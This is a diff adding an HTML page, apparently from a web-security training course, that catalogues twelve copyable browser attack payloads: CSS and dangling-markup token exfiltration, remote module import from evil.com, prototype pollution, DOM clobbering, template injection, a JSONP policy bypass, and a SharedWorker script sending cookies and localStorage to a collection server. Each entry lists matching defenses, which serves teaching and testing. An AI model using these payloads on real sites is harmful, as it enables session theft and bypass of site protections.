@@ -1,0 +1,362 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<title>Payload Bank 09 — Exotic &amp; Modern Vectors</title>
+<style>
+  :root{--bg:#0b0f1a;--panel:#141c2e;--border:#1e3a5f;--text:#e2e8f0;--muted:#7a9bbf;--accent:#38bdf8;--warn:#f5c842;--danger:#f87171;--ok:#4ade80;--orange:#fb923c;--purple:#a78bfa}
+  *{box-sizing:border-box;margin:0;padding:0}
+  body{background:var(--bg);color:var(--text);font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',sans-serif;padding:36px 32px;max-width:900px}
+  h1{font-size:22px;font-weight:800;color:var(--accent);margin-bottom:4px}
+  .sub{font-size:12px;color:var(--muted);margin-bottom:32px}
+  .entry{background:var(--panel);border:1px solid var(--border);border-radius:8px;padding:20px;margin-bottom:20px}
+  .entry-header{display:flex;justify-content:space-between;align-items:flex-start;margin-bottom:12px}
+  .entry-num{font-size:11px;font-weight:700;color:var(--muted);background:#060d1a;padding:3px 10px;border-radius:10px}
+  .tags{display:flex;flex-wrap:wrap;gap:5px}
+  .tag{font-size:10px;font-weight:700;padding:2px 8px;border-radius:10px}
+  .t-modern{background:#0d1a30;color:var(--accent)}
+  .t-exotic{background:#1a002a;color:var(--purple)}
+  .t-advanced{background:#1a1500;color:var(--warn)}
+  .payload-block{background:#060d1a;border:1px solid var(--border);border-radius:5px;padding:12px 14px;font-family:'Courier New',monospace;font-size:12px;color:var(--orange);margin:10px 0;position:relative;white-space:pre-wrap;word-break:break-all}
+  .copy-btn{position:absolute;top:8px;right:8px;font-size:10px;padding:3px 10px;background:#1e3a5f;color:var(--accent);border:1px solid var(--accent);border-radius:3px;cursor:pointer}
+  .meta{display:grid;grid-template-columns:auto 1fr;gap:4px 12px;font-size:12px;margin-top:10px}
+  .meta-key{color:var(--muted);font-weight:700;white-space:nowrap}
+  .meta-val{color:var(--text)}
+  .meta-val code{font-family:'Courier New',monospace;font-size:11px;background:#060d1a;color:var(--accent);padding:1px 5px;border-radius:3px}
+  .stopped{color:var(--ok)}
+  .bypasses{color:var(--danger)}
+  .nav{display:flex;gap:10px;margin-top:36px;padding-top:16px;border-top:1px solid var(--border)}
+  .nav a{font-size:12px;color:var(--accent);padding:7px 16px;border:1px solid var(--accent);border-radius:4px;text-decoration:none}
+  .section-label{font-size:13px;font-weight:700;color:var(--warn);margin:28px 0 10px;padding-bottom:4px;border-bottom:1px solid var(--border)}
+  a{color:var(--accent)}
+</style>
+</head>
+<body>
+
+<h1>09 — Exotic &amp; Modern Vectors</h1>
+<div class="sub">12 payloads · Module references: M09, M14 · Advanced techniques from recent research</div>
+
+<div class="section-label">A. CSS Injection for Data Exfiltration (No JS Required)</div>
+
+<div class="entry">
+  <div class="entry-header">
+    <div class="tags"><span class="tag t-exotic">CSS INJECTION</span><span class="tag t-advanced">NO JS</span></div>
+    <span class="entry-num">01</span>
+  </div>
+  <div class="payload-block"><button class="copy-btn" onclick="navigator.clipboard.writeText(this.nextSibling.textContent.trim())">copy</button>
+&lt;style&gt;
+/* CSS attribute selector exfiltration — reads CSRF token character by character */
+input[name="csrf"][value^="a"] { background: url('http://localhost:5001/oob?c=a'); }
+input[name="csrf"][value^="b"] { background: url('http://localhost:5001/oob?c=b'); }
+/* ... repeat for all possible first characters ... */
+/* Then refine: input[value^="aX"] for each second char, etc. */
+&lt;/style&gt;</div>
+  <div class="meta">
+    <span class="meta-key">Impact</span><span class="meta-val">Data exfiltration without JavaScript — works even with strict CSP that blocks all script</span>
+    <span class="meta-key">Technique</span><span class="meta-val">CSS attribute selector <code>[attr^="prefix"]</code> triggers background-image load — acts as an oracle for token values</span>
+    <span class="meta-key">Bypasses</span><span class="meta-val bypasses">CSP that blocks all JavaScript (script-src 'none') but allows style injection and external image loads</span>
+    <span class="meta-key">Stopped by</span><span class="meta-val stopped">CSP <code>style-src 'nonce-…'</code> blocking injected styles; CSP <code>img-src 'self'</code> blocking external image loads; Trusted Types (doesn't help here — no DOM sink)</span>
+    <span class="meta-key">Note</span><span class="meta-val">Each CSS rule fires a network request only when the selector matches. Attacker iterates through all possible character values, observing which requests arrive at their server. Builds up the token one character at a time. Requires many requests but no JS at all — defeats "block all scripts" defenses.</span>
+  </div>
+</div>
+
+<div class="entry">
+  <div class="entry-header">
+    <div class="tags"><span class="tag t-exotic">CSS INJECTION</span><span class="tag t-advanced">DANGLING MARKUP</span></div>
+    <span class="entry-num">02</span>
+  </div>
+  <div class="payload-block"><button class="copy-btn" onclick="navigator.clipboard.writeText(this.nextSibling.textContent.trim())">copy</button>
+&lt;!-- Dangling markup — inject an unclosed &lt;img src=" that swallows subsequent HTML --&gt;
+&lt;img src='http://localhost:5001/oob?data=
+
+&lt;!-- If injection point is in the middle of the page, everything until the next
+     quote character becomes part of the src URL — including CSRF tokens in forms --&gt;
+
+&lt;!-- Example: injection lands before: --&gt;
+&lt;form&gt;&lt;input name="csrf" value="SECRET_TOKEN"&gt;&lt;/form&gt;
+&lt;!-- The browser fetches: http://localhost:5001/oob?data=[everything including SECRET_TOKEN] --&gt;</div>
+  <div class="meta">
+    <span class="meta-key">Impact</span><span class="meta-val">Token exfiltration without script execution — works with strict CSP</span>
+    <span class="meta-key">Technique</span><span class="meta-val">Unclosed attribute absorbs subsequent HTML including secrets; browser fetches the URL containing the secret</span>
+    <span class="meta-key">Bypasses</span><span class="meta-val bypasses">CSP blocking all scripts (no JS needed); filters that check for closing &gt; after the injection</span>
+    <span class="meta-key">Stopped by</span><span class="meta-val stopped">CSP <code>img-src 'self'</code>; output encoding (encodes the opening quote, closing the attribute properly); Content-Security-Policy disallowing external images</span>
+    <span class="meta-key">Origin</span><span class="meta-val">Documented by Google Project Zero. "Dangling markup injection" is a technique for data exfiltration when HTML injection is possible but script execution is blocked. The unclosed quote causes the browser to treat page content as a URL attribute value.</span>
+  </div>
+</div>
+
+<div class="section-label">B. Dynamic import() and Module Loading</div>
+
+<div class="entry">
+  <div class="entry-header">
+    <div class="tags"><span class="tag t-modern">DYNAMIC IMPORT</span><span class="tag t-advanced">CSP BYPASS</span></div>
+    <span class="entry-num">03</span>
+  </div>
+  <div class="payload-block"><button class="copy-btn" onclick="navigator.clipboard.writeText(this.nextSibling.textContent.trim())">copy</button>
+&lt;img src=x onerror="
+  // Dynamic import() loads an ES module
+  import('//evil.com/xss.mjs').then(m =&gt; m.default());
+"&gt;
+
+// xss.mjs content:
+export default function() { alert(document.domain); }</div>
+  <div class="meta">
+    <span class="meta-key">Impact</span><span class="meta-val">Loads and executes external JS as an ES module</span>
+    <span class="meta-key">Bypasses</span><span class="meta-val bypasses">Some CSP configurations that allow script-src but don't account for dynamic import() as a separate fetch type</span>
+    <span class="meta-key">Stopped by</span><span class="meta-val stopped">CSP <code>script-src</code> applies to import() too in modern browsers; blocking external script loads; Trusted Types</span>
+    <span class="meta-key">Note</span><span class="meta-val">Dynamic import() is subject to CSP script-src in Chrome 66+ and Firefox 68+. However, some WAF rules check for "script" tag injection and miss import() as a dynamic code-loading vector entirely. Important for internal threat models.</span>
+  </div>
+</div>
+
+<div class="entry">
+  <div class="entry-header">
+    <div class="tags"><span class="tag t-modern">BLOB URL</span><span class="tag t-advanced">CSP BYPASS</span></div>
+    <span class="entry-num">04</span>
+  </div>
+  <div class="payload-block"><button class="copy-btn" onclick="navigator.clipboard.writeText(this.nextSibling.textContent.trim())">copy</button>
+&lt;img src=x onerror="
+  // Create a blob: URL containing JS, then import it
+  const code = 'export default () =&gt; alert(document.domain)';
+  const blob = new Blob([code], {type: 'application/javascript'});
+  const url = URL.createObjectURL(blob);
+  import(url).then(m =&gt; m.default());
+"&gt;</div>
+  <div class="meta">
+    <span class="meta-key">Impact</span><span class="meta-val">Creates and loads JS from a blob: URL — no external request needed</span>
+    <span class="meta-key">Bypasses</span><span class="meta-val bypasses">CSP rules that only restrict external URLs; if script-src allows blob: (some CSP configs do to support Web Workers)</span>
+    <span class="meta-key">Stopped by</span><span class="meta-val stopped">CSP <code>script-src</code> without <code>blob:</code>; Trusted Types; preventing XSS</span>
+    <span class="meta-key">Note</span><span class="meta-val">blob: URLs are same-origin. If a CSP says <code>script-src 'self' blob:</code> (common for apps using Web Workers with inline code), blob: import is unrestricted. This is why adding blob: to script-src should be done carefully.</span>
+  </div>
+</div>
+
+<div class="section-label">C. Prototype Pollution Gadgets (Modern)</div>
+
+<div class="entry">
+  <div class="entry-header">
+    <div class="tags"><span class="tag t-modern">PROTO POLLUTION</span><span class="tag t-advanced">GADGET</span></div>
+    <span class="entry-num">05</span>
+  </div>
+  <div class="payload-block"><button class="copy-btn" onclick="navigator.clipboard.writeText(this.nextSibling.textContent.trim())">copy</button>
+// jQuery &lt; 3.4.0 — $.extend(true, …) prototype pollution gadget
+// URL: ?__proto__[html]=&lt;img src=x onerror=alert(1)&gt;
+
+// App code (unmodified — victim code):
+$.ajax({ url: '/api/data', success: function(data) {
+  $.extend(true, {}, data);  // ← pollution here if data comes from URL params
+  $('#output').html($('#output').html());  // ← gadget: .html() reads from prototype
+}});</div>
+  <div class="meta">
+    <span class="meta-key">Impact</span><span class="meta-val">XSS via prototype pollution + jQuery gadget — no direct injection point visible in the code</span>
+    <span class="meta-key">Bypasses</span><span class="meta-val bypasses">Code review (source and sink in different call chains); taint analysis (connected via Object.prototype)</span>
+    <span class="meta-key">Stopped by</span><span class="meta-val stopped">jQuery ≥ 3.4.0 (fixed deep merge); Object.freeze(Object.prototype); Trusted Types; hasOwnProperty checks</span>
+    <span class="meta-key">Origin</span><span class="meta-val">CVE-2019-11358 — jQuery.extend deep merge prototype pollution. The gadget is jQuery's own .html() method which reads from element properties that may be on Object.prototype after pollution.</span>
+  </div>
+</div>
+
+<div class="entry">
+  <div class="entry-header">
+    <div class="tags"><span class="tag t-modern">PROTO POLLUTION</span><span class="tag t-advanced">URL-BASED</span></div>
+    <span class="entry-num">06</span>
+  </div>
+  <div class="payload-block"><button class="copy-btn" onclick="navigator.clipboard.writeText(this.nextSibling.textContent.trim())">copy</button>
+// URL-based prototype pollution (no form input needed):
+http://target/?__proto__[innerHTML]=&lt;img src=x onerror=alert(1)&gt;
+http://target/?constructor[prototype][innerHTML]=&lt;img src=x onerror=alert(1)&gt;
+http://target/?__proto__.innerHTML=&lt;img src=x onerror=alert(1)&gt;
+
+// Alternative key formats to try:
+// constructor.prototype
+// __proto__
+// __proto__[key]
+// %5F%5Fproto%5F%5F (URL-encoded __proto__)
+// constructor%5Bprototype%5D</div>
+  <div class="meta">
+    <span class="meta-key">Impact</span><span class="meta-val">Prototype pollution via URL — works against apps using qs, querystring, or custom URL parsers that support nested objects</span>
+    <span class="meta-key">Bypasses</span><span class="meta-val bypasses">Apps that sanitize POST body but use URL params for config; client-side query parsers</span>
+    <span class="meta-key">Stopped by</span><span class="meta-val stopped">URL parser key validation; Object.freeze(Object.prototype); fixing deepMerge; Trusted Types</span>
+    <span class="meta-key">Note</span><span class="meta-val">The <code>qs</code> library (used in Express.js) has historically parsed <code>__proto__[key]=val</code> into nested objects allowing pollution. Multiple formats to try — apps may normalize different ways. Also try URL-encoded versions of the keys.</span>
+  </div>
+</div>
+
+<div class="section-label">D. Trusted Types Bypass Attempts</div>
+
+<div class="entry">
+  <div class="entry-header">
+    <div class="tags"><span class="tag t-modern">TRUSTED TYPES</span><span class="tag t-advanced">BYPASS ATTEMPT</span></div>
+    <span class="entry-num">07</span>
+  </div>
+  <div class="payload-block"><button class="copy-btn" onclick="navigator.clipboard.writeText(this.nextSibling.textContent.trim())">copy</button>
+// Trusted Types bypass via overly permissive createHTML policy:
+const policy = trustedTypes.createPolicy('default', {
+  createHTML: (s) =&gt; s  // ← VULNERABLE: passes any string through
+});
+
+// Attacker payload:
+element.innerHTML = policy.createHTML('&lt;img src=x onerror=alert(1)&gt;');
+// Trusted Types "passes" — but the policy is the vulnerability, not TT itself
+
+// Lesson: TT is a security boundary enforcement tool, not a sanitizer.
+// The policy MUST call DOMPurify or equivalent. "createHTML: s =&gt; s" defeats TT entirely.</div>
+  <div class="meta">
+    <span class="meta-key">Impact</span><span class="meta-val">Trusted Types with a pass-through policy provides no actual security benefit</span>
+    <span class="meta-key">Note</span><span class="meta-val">This isn't a bypass of Trusted Types itself — it's a misconfiguration. TT enforces that createHTML is called. It doesn't enforce that createHTML sanitizes. A pass-through policy is like putting a lock on a door and giving everyone the key.</span>
+    <span class="meta-key">Correct usage</span><span class="meta-val stopped"><code>createHTML: (s) =&gt; DOMPurify.sanitize(s)</code> — the policy must contain the real defense</span>
+    <span class="meta-key">Origin</span><span class="meta-val">Common mistake when adopting Trusted Types. Teams add TT compliance without understanding that the security comes from the policy body, not from the TT enforcement itself.</span>
+  </div>
+</div>
+
+<div class="entry">
+  <div class="entry-header">
+    <div class="tags"><span class="tag t-modern">TRUSTED TYPES</span><span class="tag t-advanced">DOM CLOBBERING</span></div>
+    <span class="entry-num">08</span>
+  </div>
+  <div class="payload-block"><button class="copy-btn" onclick="navigator.clipboard.writeText(this.nextSibling.textContent.trim())">copy</button>
+&lt;!-- DOM Clobbering — HTML injection that doesn't need event handlers --&gt;
+&lt;!-- Overwrites global variables by exploiting named element access --&gt;
+
+&lt;form id="config"&gt;&lt;input id="apiUrl" value="javascript:alert(1)"&gt;&lt;/form&gt;
+
+&lt;!-- Vulnerable app code: --&gt;
+&lt;script&gt;
+  // Developer expects config to be an object imported elsewhere
+  // But DOM clobbering makes window.config point to the form element
+  // And config.apiUrl returns the input element, whose toString() is its value
+  const url = config.apiUrl;  // =&gt; returns input element
+  location.href = url;  // =&gt; navigates to javascript:alert(1)
+&lt;/script&gt;</div>
+  <div class="meta">
+    <span class="meta-key">Impact</span><span class="meta-val">Code execution without event handlers or script tags — overrides JS globals via HTML element naming</span>
+    <span class="meta-key">Mechanism</span><span class="meta-val">HTML elements with id= are accessible as global window properties; forms with id= and named inputs create object-property chains</span>
+    <span class="meta-key">Bypasses</span><span class="meta-val bypasses">Sanitizers that allow id attributes; DOMPurify (older versions — now blocks by default); Trusted Types (different sink — location.href not innerHTML)</span>
+    <span class="meta-key">Stopped by</span><span class="meta-val stopped">DOMPurify 2.x+ with SANITIZE_DOM enabled; sanitizers stripping id attributes; Trusted Types createScriptURL; validating URL scheme before navigation</span>
+    <span class="meta-key">Origin</span><span class="meta-val">DOM Clobbering — a technique exploiting the legacy HTML behaviour where named elements become global variables. id=config makes window.config point to the element. Documented extensively by PortSwigger research team.</span>
+  </div>
+</div>
+
+<div class="section-label">E. WebAssembly &amp; Worker Vectors</div>
+
+<div class="entry">
+  <div class="entry-header">
+    <div class="tags"><span class="tag t-modern">WASM</span><span class="tag t-advanced">OBFUSCATION</span></div>
+    <span class="entry-num">09</span>
+  </div>
+  <div class="payload-block"><button class="copy-btn" onclick="navigator.clipboard.writeText(this.nextSibling.textContent.trim())">copy</button>
+&lt;img src=x onerror="
+  // WebAssembly as obfuscation layer — WAF sees no recognisable JS keywords
+  // The WASM module calls a JS import: window.alert
+  const wasm = new Uint8Array([
+    0,97,115,109,1,0,0,0,  // WASM magic + version
+    // ... (abbreviated) module that imports 'alert' from JS env and calls it
+  ]);
+  // In practice: compile Rust/C to WASM that calls back into JS
+  // WAF: sees binary data, not 'alert' or 'document'
+  WebAssembly.instantiate(wasm, {env: {alert: window.alert}})
+    .then(m =&gt; m.instance.exports.run());
+"&gt;</div>
+  <div class="meta">
+    <span class="meta-key">Impact</span><span class="meta-val">Obfuscation of payload logic in binary format — no recognisable JS keywords</span>
+    <span class="meta-key">Bypasses</span><span class="meta-val bypasses">Content scanners that look for "alert", "document", "cookie" in text; static analysis tools that don't inspect WASM imports</span>
+    <span class="meta-key">Stopped by</span><span class="meta-val stopped">CSP <code>script-src</code> without <code>unsafe-eval</code> (WebAssembly.instantiate uses eval-like semantics in some models); Trusted Types; preventing XSS</span>
+    <span class="meta-key">Note</span><span class="meta-val">WASM payloads are largely theoretical in XSS context — they're more complex to deliver than standard JS and provide no additional capability. Their interest is as an obfuscation layer that defeats text-based content scanning. Practically: CSP blocks WASM in eval mode.</span>
+  </div>
+</div>
+
+<div class="entry">
+  <div class="entry-header">
+    <div class="tags"><span class="tag t-modern">SHARED WORKER</span><span class="tag t-advanced">CROSS-TAB</span></div>
+    <span class="entry-num">10</span>
+  </div>
+  <div class="payload-block"><button class="copy-btn" onclick="navigator.clipboard.writeText(this.nextSibling.textContent.trim())">copy</button>
+&lt;img src=x onerror="
+  // SharedWorker persists across all tabs of the same origin
+  const workerCode = \`
+    const ports = [];
+    self.onconnect = e =&gt; {
+      const port = e.ports[0];
+      ports.push(port);
+      port.onmessage = msg =&gt; {
+        // Broadcast to all connected tabs
+        ports.forEach(p =&gt; p.postMessage({stolen: msg.data}));
+        // Exfil
+        fetch('http://localhost:5001/oob?d='+encodeURIComponent(JSON.stringify(msg.data)));
+      };
+    };
+  \`;
+  const blob = new Blob([workerCode], {type:'application/javascript'});
+  const sw = new SharedWorker(URL.createObjectURL(blob));
+  sw.port.onmessage = e =&gt; console.log('from worker:', e.data);
+  sw.port.start();
+  // Now exfiltrate data by posting to sw.port
+  sw.port.postMessage({cookie: document.cookie, ls: JSON.stringify(localStorage)});
+"&gt;</div>
+  <div class="meta">
+    <span class="meta-key">Impact</span><span class="meta-val">SharedWorker persists across all tabs — a single XSS payload infects the entire browser session for that origin</span>
+    <span class="meta-key">Bypasses</span><span class="meta-val bypasses">Tab-specific defenses; page reload (worker survives)</span>
+    <span class="meta-key">Stopped by</span><span class="meta-val stopped">CSP <code>worker-src</code> blocking blob:; closing all tabs (SharedWorker dies when no tabs connect); preventing XSS</span>
+    <span class="meta-key">Note</span><span class="meta-val">SharedWorkers live at the origin level — they're shared across all tabs. One XSS payload can plant a SharedWorker that intercepts communication from all tabs. Survives page navigation within the origin. Cleared only when all tabs close or the worker is explicitly terminated.</span>
+  </div>
+</div>
+
+<div class="entry">
+  <div class="entry-header">
+    <div class="tags"><span class="tag t-exotic">CSTI</span><span class="tag t-advanced">TEMPLATE INJECTION</span></div>
+    <span class="entry-num">11</span>
+  </div>
+  <div class="payload-block"><button class="copy-btn" onclick="navigator.clipboard.writeText(this.nextSibling.textContent.trim())">copy</button>
+// Client-Side Template Injection (CSTI) — Angular 1.x expression injection
+// If user input is placed in an Angular template context:
+{{constructor.constructor('alert(1)')()}}
+
+// Vue 2 equivalent:
+{{_c.constructor('alert(1)')()}}
+
+// React does NOT have this issue — JSX expressions are escaped by default
+// Angular 2+ uses strict sandboxing — harder to bypass
+
+// Classic Angular 1.x sandbox bypass:
+{{'a'.constructor.prototype.charAt=[].join;$eval('x=alert(1)');}}</div>
+  <div class="meta">
+    <span class="meta-key">Impact</span><span class="meta-val">Code execution via framework expression evaluation — template engine evaluates user input as code</span>
+    <span class="meta-key">Bypasses</span><span class="meta-val bypasses">XSS filters (the payload uses {{ }} not &lt;script&gt;); HTML sanitizers (the payload has no HTML tags)</span>
+    <span class="meta-key">Stopped by</span><span class="meta-val stopped">Never placing user input in Angular/template expression contexts; using modern Angular (2+) with strict content security; CSP</span>
+    <span class="meta-key">Origin</span><span class="meta-val">CSTI differs from XSS: the payload doesn't inject HTML — it injects into a template expression context. Angular 1.x's $eval creates a JS execution context from template expressions. Many CSTI payloads look like junk to XSS scanners but execute in the framework.</span>
+  </div>
+</div>
+
+<div class="entry">
+  <div class="entry-header">
+    <div class="tags"><span class="tag t-modern">JSONP</span><span class="tag t-advanced">CSP BYPASS</span></div>
+    <span class="entry-num">12</span>
+  </div>
+  <div class="payload-block"><button class="copy-btn" onclick="navigator.clipboard.writeText(this.nextSibling.textContent.trim())">copy</button>
+// CSP allowlists *.googleapis.com for Google APIs
+// googleapis.com has JSONP endpoints usable as script gadgets:
+// https://accounts.google.com/o/oauth2/revoke?callback=alert(1)
+// Returns: alert(1)({"error":"invalid_token",...})
+
+// If CSP allows: script-src *.googleapis.com
+// Inject: &lt;script src="https://accounts.google.com/o/oauth2/revoke?callback=alert(1)"&gt;&lt;/script&gt;
+// Browser fetches from allowlisted domain → executes alert(1)
+
+// Other common JSONP gadgets on allowlisted CDNs:
+// *.cloudflare.com, *.jquery.com, *.bootstrapcdn.com — check for JSONP endpoints</div>
+  <div class="meta">
+    <span class="meta-key">Impact</span><span class="meta-val">CSP bypass via trusted domain with JSONP endpoint — CSP host allowlists are fundamentally fragile</span>
+    <span class="meta-key">Bypasses</span><span class="meta-val bypasses">CSP that allowlists full domains rather than specific paths; any CSP with *.googleapis.com in script-src</span>
+    <span class="meta-key">Stopped by</span><span class="meta-val stopped">Nonce-based CSP (allowlisting by nonce, not domain); removing *.googleapis.com from script-src; strict-dynamic CSP</span>
+    <span class="meta-key">Origin</span><span class="meta-val">Documented by Sebastian Lekies, Krzysztof Kotowicz, Eduardo Vela. Any trusted domain that has a JSONP endpoint becomes a CSP bypass gadget. *.googleapis.com, *.google.com, *.gstatic.com all have known JSONP endpoints. This is why host-based CSP is considered weak compared to nonce/hash-based.</span>
+  </div>
+</div>
+
+<div class="nav">
+  <a href="08_chaining_payloads.html">← 08: Chaining</a>
+  <a href="../payload_bank.html">Index</a>
+  <a href="10_real_world_derived.html">10: Real-World →</a>
+</div>
+
+<script>
+document.querySelectorAll('.copy-btn').forEach(btn => {
+  btn.addEventListener('click', () => { btn.textContent = 'copied!'; setTimeout(() => btn.textContent = 'copy', 1500); });
+});
+</script>
+</body>
+</html>
